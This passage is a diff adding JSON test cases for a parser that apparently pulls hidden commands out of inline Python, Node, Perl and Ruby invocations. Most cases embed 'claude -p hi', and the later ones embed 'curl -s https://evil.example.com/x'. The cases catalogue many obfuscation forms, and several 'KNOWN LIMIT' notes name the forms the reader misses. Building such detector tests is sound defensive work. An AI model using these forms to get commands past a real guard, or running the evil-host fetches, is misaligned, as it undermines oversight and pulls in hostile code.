+   "cmd": "python3 -c '__import__(\"pty\").spawn([\"sh\",\"-c\",\"claude -p hi\"])'",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r3/py-importlib-pty",
+   "cmd": "python3 -c 'import importlib; importlib.import_module(\"pty\").spawn([\"sh\",\"-c\",\"claude -p hi\"])'",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r3/node-cp-alias-after-comma",
+   "cmd": "node -e 'const a=1, cp=require(\"child_process\"); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/node-cp-assign-later",
+   "cmd": "node -e 'let cp; cp = require(\"child_process\"); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/node-destr-after-comma",
+   "cmd": "node -e 'const a=1, {exec}=require(\"child_process\"); exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/node-import-default-named",
+   "cmd": "node --input-type=module - <<'JS'\nimport cpd, { exec as x } from 'child_process'\nx('claude -p hi')\nJS",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/node-import-default-named-dflt",
+   "cmd": "node --input-type=module - <<'JS'\nimport cpd, { exec as x } from 'child_process'\ncpd.exec('claude -p hi')\nJS",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/node-import-default-star",
+   "cmd": "node --input-type=module - <<'JS'\nimport cpd, * as ns from 'node:child_process'\nns.spawn('sh', ['-c', 'claude -p hi'])\nJS",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r3/py-from-import-paren-multiline",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import (\n    run as r,\n)\nr('claude -p hi', shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/py-from-import-backslash",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import run as r, \\\n    call\ncall('claude -p hi', shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/py-from-os-paren-multiline",
+   "cmd": "python3 - <<'PY'\nfrom os import (\n    path,\n    system as s,\n)\ns('claude -p hi')\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/perl-system-bare",
+   "cmd": "perl -e 'system \"claude -p hi\"'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/perl-exec-bare-E",
+   "cmd": "perl -E 'exec \"claude -p hi\"'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/perl-system-bare-list",
+   "cmd": "perl -e 'system \"sh\", \"-c\", \"claude -p hi\"'",
+   "commands": [
+    "sh -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "r3/ruby-system-bare",
+   "cmd": "ruby -e 'system \"claude -p hi\"'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/ruby-kernel-system",
+   "cmd": "ruby -e 'Kernel.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/ruby-kernel-system-bare",
+   "cmd": "ruby -e 'Kernel.system \"claude -p hi\"'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r3/ruby-process-spawn",
+   "cmd": "ruby -e 'Process.spawn(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "limit/ruby-bare-spawn",
+   "cmd": "ruby -e 'Process.wait spawn(\"claude -p hi\")'",
+   "commands": [],
+   "note": "KNOWN LIMIT (#779 r3): a bare spawn( is not read; it would also catch a JS spawn imported from another module (r2 negative)."
+  },
+  {
+   "name": "limit/php-r",
+   "cmd": "php -r 'system(\"claude -p hi\");'",
+   "commands": [],
+   "note": "KNOWN LIMIT (#779 r3): php -r is not a script flag to the readers."
+  },
+  {
+   "name": "limit/perl-indirect-object",
+   "cmd": "perl -e 'system { \"sh\" } \"sh\", \"-c\", \"claude -p hi\"'",
+   "commands": [],
+   "note": "KNOWN LIMIT (#779 r3): perl indirect-object system { \"sh\" } ... is not read."
+  },
+  {
+   "name": "neg/perl-print-system-word",
+   "cmd": "perl -e 'print \"system claude -p hi\"'",
+   "commands": []
+  },
+  {
+   "name": "neg/ruby-method-system-bare",
+   "cmd": "ruby -e 'obj.system \"claude -p hi\"'",
+   "commands": []
+  },
+  {
+   "name": "over-read/perl-commented-system",
+   "cmd": "perl -e 'print 1; # system \"claude -p hi\"'",
+   "commands": [
+    "claude -p hi"
+   ],
+   "note": "CONSERVATIVE OVER-READ (#779 r3): a comment inside an inline -e/-c payload is not stripped, so a commented call counts; the parenthesised form behaves the same since round 1."
+  },
+  {
+   "name": "neg/node-assign-other-module",
+   "cmd": "node -e 'let db; db = require(\"./db\"); db.exec(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "over-read/node-exec-other-module",
+   "cmd": "node --input-type=module - <<'JS'\nimport x, { exec } from './pool.js'\nexec('claude -p hi')\nJS",
+   "commands": [
+    "claude -p hi"
+   ],
+   "note": "CONSERVATIVE OVER-READ (#779 r1): a bare exec( counts whatever module it came from (perl/php exec)."
+  },
+  {
+   "name": "neg/py-from-import-paren-other",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import (\n    PIPE,\n)\nprint('claude -p hi')\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-ctx-spawn",
+   "cmd": "python3 -c 'import multiprocessing as m; ctx = m.get_context(\"spawn\"); print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-dunder-pty-other",
+   "cmd": "python3 -c 'print(__import__(\"pty\").STDIN_FILENO, \"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "r4/python-minor-version",
+   "cmd": "python3.12 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/py314-c",
+   "cmd": "python3.14 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/py314t-abs-c",
+   "cmd": "/usr/bin/python3.14t -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/py314-I-c",
+   "cmd": "python3.14 -I -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/py314-heredoc",
+   "cmd": "python3.14 - <<'PY'\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/py314-heredoc-nodash",
+   "cmd": "python3.14 <<'PY'\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/py27-c",
+   "cmd": "python2.7 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/node22-e",
+   "cmd": "node22 -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/nodejs-e",
+   "cmd": "nodejs -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/perl536-e",
+   "cmd": "perl5.36 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/ruby32-e",
+   "cmd": "ruby3.2 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/env-py314-c",
+   "cmd": "env python3.14 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-python-no-dash",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-python-I",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | python3 -I",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-python-W",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | python3 -W ignore",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-py314",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | python3.14",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-env-python",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | env python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/printf-pipe-python",
+   "cmd": "printf '%s\\n' 'import os; os.system(\"claude -p hi\")' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-node",
+   "cmd": "echo 'require(\"child_process\").execSync(\"claude -p hi\")' | node",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-perl",
+   "cmd": "echo 'system(\"claude -p hi\")' | perl",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r4/pipe-ruby",
+   "cmd": "echo 'system(\"claude -p hi\")' | ruby",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/pipe-json-tool",
+   "cmd": "echo '{\"cmd\": \"os.system(claude -p hi)\"}' | python3 -m json.tool",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-py-script",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | python3 script.py",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-py-W-script",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | python3 -W ignore script.py",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-py-c",
+   "cmd": "echo 'os.system(\"claude -p hi\")' | python3 -c 'import sys; print(len(sys.stdin.read()))'",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-node-script",
+   "cmd": "echo 'require(\"child_process\").execSync(\"claude -p hi\")' | node tool.js",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-node-r-script",
+   "cmd": "echo 'require(\"child_process\").execSync(\"claude -p hi\")' | node -r ./setup.js app.js",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-ruby-I-script",
+   "cmd": "echo 'system(\"claude -p hi\")' | ruby -I lib app.rb",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-wc",
+   "cmd": "echo 'import os; os.system(\"claude -p hi\")' | wc -c",
+   "commands": []
+  },
+  {
+   "name": "neg/py314-print",
+   "cmd": "python3.14 -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/node22-log",
+   "cmd": "node22 -e 'console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "r5/py-hashpycs-eq",
+   "cmd": "python3 --check-hash-based-pycs=never -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py-hashpycs-sep",
+   "cmd": "python3 --check-hash-based-pycs never -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py-OB-hashpycs-sep",
+   "cmd": "python3 -O -B --check-hash-based-pycs always -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py-Wattached-c",
+   "cmd": "python3 -Wignore -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py-Xattached-c",
+   "cmd": "python3 -Xdev -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py314-hashpycs-eq",
+   "cmd": "python3.14 --check-hash-based-pycs=never -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-inputtype-eq-e",
+   "cmd": "node --input-type=module -e 'import { exec } from \"child_process\"; exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-inputtype-sep-e",
+   "cmd": "node --input-type module -e 'import { exec } from \"child_process\"; exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-inputtype-eq-eval-eq",
+   "cmd": "node --input-type=module --eval='import { exec } from \"child_process\"; exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-inputtype-eq-eval-sep",
+   "cmd": "node --input-type=module --eval 'import { exec } from \"child_process\"; exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-r-sep-e",
+   "cmd": "node -r ./x.js -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-require-eq-e",
+   "cmd": "node --require=./x.js -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-require-sep-e",
+   "cmd": "node --require ./x.js -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-stacksize-sep-p",
+   "cmd": "node --stack-size 100 -p 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-eval-eq-plain",
+   "cmd": "node --eval='require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/perl-M-eq-e",
+   "cmd": "perl -MPOSIX=floor -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/perl-M-sep-e",
+   "cmd": "perl -M POSIX -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/perl-I-sep-le",
+   "cmd": "perl -I lib -le 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/perl-Iattached-e",
+   "cmd": "perl -Ilib -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/ruby-r-sep-e",
+   "cmd": "ruby -r json -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/ruby-r-attached-e",
+   "cmd": "ruby -rjson -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/ruby-encoding-eq-e",
+   "cmd": "ruby --encoding=utf-8 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/ruby-encoding-sep-e",
+   "cmd": "ruby --encoding utf-8 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/ruby-I-sep-e",
+   "cmd": "ruby -I lib -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py-dunder-import-spaces",
+   "cmd": "python3 -c '__import__ ( \"os\" ).system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/py-importlib-from",
+   "cmd": "python3 -c 'from importlib import import_module; import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/node-require-double-paren",
+   "cmd": "node -e 'require((\"child_process\")).execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/perl-qx-paren",
+   "cmd": "perl -e 'my $o = qx(claude -p hi);'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/perl-system-qq",
+   "cmd": "perl -e 'system qq(claude -p hi);'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r5/printf-multiline-pipe-python",
+   "cmd": "printf 'import os\\nos.system(\"claude -p hi\")\\n' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/node-inputtype-log",
+   "cmd": "node --input-type=module -e 'console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/perl-M-print",
+   "cmd": "perl -MPOSIX=floor -e 'print \"claude -p hi\"'",
+   "commands": []
+  },
+  {
+   "name": "neg/ruby-r-puts",
+   "cmd": "ruby -r json -e 'puts \"claude -p hi\"'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-hashpycs-print",
+   "cmd": "python3 --check-hash-based-pycs never -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/separator-then-echo-e",
+   "cmd": "python3 tool.py; echo -e 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/pipe-then-grep-e",
+   "cmd": "python3 tool.py | grep -e 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/and-then-echo-e",
+   "cmd": "node app.js && echo -e 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "r6/r1-py-2>&1-c/cc",
+   "cmd": "python3 2>&1 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-node->null-2>&1-e/cc",
+   "cmd": "node >/dev/null 2>&1 -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>null-c/cc",
+   "cmd": "python3 &>/dev/null -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>>log-c/cc",
+   "cmd": "python3 &>>log.txt -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-perl->&2-e/cc",
+   "cmd": "perl >&2 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-ruby-2>&1-e/cc",
+   "cmd": "ruby 2>&1 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-<&0-c/cc",
+   "cmd": "python3 <&0 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py->|f-c/cc",
+   "cmd": "python3 >|out.txt -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-I-2>&1-c/cc",
+   "cmd": "python3 -I 2>&1 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r2-py-bsnl-c/cc",
+   "cmd": "python3 \\\n  -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r2-node-stack-bsnl-e/cc",
+   "cmd": "node --stack-size=2000 \\\n -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r2-perl-bsnl-e/cc",
+   "cmd": "perl \\\n -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-attached-c/cc",
+   "cmd": "python3 -c'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-Ic-attached/cc",
+   "cmd": "python3 -Ic'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-perl-attached-e/cc",
+   "cmd": "perl -e'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-flag/cc",
+   "cmd": "python3 \"-c\" 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-quoted-flag/cc",
+   "cmd": "node '-e' 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-ansi-c/cc",
+   "cmd": "python3 -c $'import os\\nos.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-concat/cc",
+   "cmd": "python3 -c \"import os; \"'os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-interp/cc",
+   "cmd": "'python3' -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-dquoted-interp/cc",
+   "cmd": "\"node\" -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print/cc",
+   "cmd": "node --print 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print-eq/cc",
+   "cmd": "node --print='require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r5-node-alias-nested/cc",
+   "cmd": "node -e 'let cp = require( ( \"node:child_process\" ) ); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r5-node-multidecl-nested/cc",
+   "cmd": "node -e 'const a=f((1)), cp=require((\"child_process\")); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-qx-space/cc",
+   "cmd": "perl -e 'print qx (claude -p hi)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-system-qq-space/cc",
+   "cmd": "perl -e 'system qq (claude -p hi)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-x0a/cc",
+   "cmd": "printf 'import os\\x0aos.system(\"claude -p hi\")' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-012/cc",
+   "cmd": "printf 'import os\\012os.system(\"claude -p hi\")' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r8-py-import-module-as/cc",
+   "cmd": "python3 -c 'from importlib import import_module as im; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r8-py-importlib-as/cc",
+   "cmd": "python3 -c 'import importlib as il; il.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "limit/r6-perl-qx-brace-cc",
+   "cmd": "perl -e 'print qx{claude -p hi}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qq-brace-cc",
+   "cmd": "perl -e 'system qq{claude -p hi}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-bang-cc",
+   "cmd": "perl -e 'print qx!claude -p hi!'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-slash-cc",
+   "cmd": "perl -e 'print qx/claude -p hi/'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "neg/r6-py-2>&1-print-cc",
+   "cmd": "python3 2>&1 -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-redirect-log-cc",
+   "cmd": "node >/dev/null 2>&1 -e 'console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-redirect-then-echo-e-cc",
+   "cmd": "python3 tool.py 2>&1; echo -e 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-background-then-grep-e-cc",
+   "cmd": "python3 tool.py & grep -e 'claude -p hi' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-bsnl-script-arg-cc",
+   "cmd": "python3 \\\n  tool.py --note 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-py-attached-print-cc",
+   "cmd": "python3 -c'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-echo-quoted-flag-cc",
+   "cmd": "echo \"-c\" 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-print-version-cc",
+   "cmd": "node --print 'process.version' ; echo 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-printf-x0a-cat-cc",
+   "cmd": "printf 'hello\\x0aclaude -p hi' | cat",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-perl-qx-space-ls-cc",
+   "cmd": "perl -e 'print qx (ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r6-py-import-module-as-json-cc",
+   "cmd": "python3 -c 'from importlib import import_module as im; print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-ansi-echo-cc",
+   "cmd": "echo $'line\\nclaude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "r6/r1-py-2>&1-c/eg",
+   "cmd": "python3 2>&1 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-node->null-2>&1-e/eg",
+   "cmd": "node >/dev/null 2>&1 -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>null-c/eg",
+   "cmd": "python3 &>/dev/null -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>>log-c/eg",
+   "cmd": "python3 &>>log.txt -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-perl->&2-e/eg",
+   "cmd": "perl >&2 -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-ruby-2>&1-e/eg",
+   "cmd": "ruby 2>&1 -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-<&0-c/eg",
+   "cmd": "python3 <&0 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py->|f-c/eg",
+   "cmd": "python3 >|out.txt -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-I-2>&1-c/eg",
+   "cmd": "python3 -I 2>&1 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r2-py-bsnl-c/eg",
+   "cmd": "python3 \\\n  -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r2-node-stack-bsnl-e/eg",
+   "cmd": "node --stack-size=2000 \\\n -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r2-perl-bsnl-e/eg",
+   "cmd": "perl \\\n -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-attached-c/eg",
+   "cmd": "python3 -c'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-Ic-attached/eg",
+   "cmd": "python3 -Ic'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-perl-attached-e/eg",
+   "cmd": "perl -e'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
